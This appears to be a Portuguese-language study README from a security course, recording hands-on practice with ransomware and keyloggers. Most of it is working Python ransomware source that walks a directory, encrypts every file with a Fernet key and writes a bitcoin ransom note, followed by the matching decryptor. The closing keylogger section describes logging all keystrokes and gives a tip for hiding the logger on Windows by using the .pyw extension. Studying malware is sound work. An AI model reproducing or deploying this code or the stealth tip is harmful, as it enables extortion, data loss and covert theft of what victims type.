# estudo_ransomware_e_keylogger
Aprendizagem sobre o funcionamento de um ransomware e keyloggers


Em todo o curso tive um aprendizado muito bacana de como é o funcionamento de um ransomware e um keylogger.
Realizei toda a prática ensinada / orientada para que eu pudesse sentir diretamente como é feito o processo.

Utilizei os mesmos scripts no VSCode para as duas técnicas.


## Malware - Ransomware: Criptograr ##

> Script para que os dados de alguns arquivos sejam criptografados através de uma chave e somente após o pagamento de resgate, a chave é informada para descriptografar esses dados.
>
> 

from cryptography.fernet import Fernet
import os


> #1. Gerar uma chave de criptpgrafia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
          chave_file.write(chave)

> #2. Carregar a chave salva

def carregar_chave():
    return open("chave.key", "rb").read()


> #3. Criptografar um único arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open (arquivo, "wb") as file:
        file.write(dados_encriptados)

> #4. Econtrar arquivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

> #5. Mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso enviaremos a chave para você recuperar seus dados")

> #6. Execução principal

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("RAMSOMWARE EXECUTADO! ARQUIVOS CRIPTOGRAFADOS!")


if __name__ == "__main__":
    main()

    -----------------------------------------
    
## Malware - Ransomware: Descriptograr ##

from cryptography.fernet import Fernet
import os  

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
    main()

    --------------------------------------

## Malware - Keylogger: ##

> KEYLOGGER > Registra tudo o que é digitado na máquina da vítima.

Instalar a lib (biblioteca) no VSCode:

> pip install pynput

1- Fica em execução em segundo plano; 
2- Sempre que for digitada uma tecla pelo usuário, o programa captura a tecla; 
3- O que for digitado será gravado em um arquivo .txt; 
4- O arquivo vai mostrar tudo o que foi digitado e de forma sequencial.

***No WINDOWS, para ficar invisível, apenas precisamos renomear o arquivo com a extensão .pyw (Exemplo: keylogger.pyw)

Dessa forma, fica em modo FURTIVO sem a necessidade de Terminal aberto.
    
    ==========================================
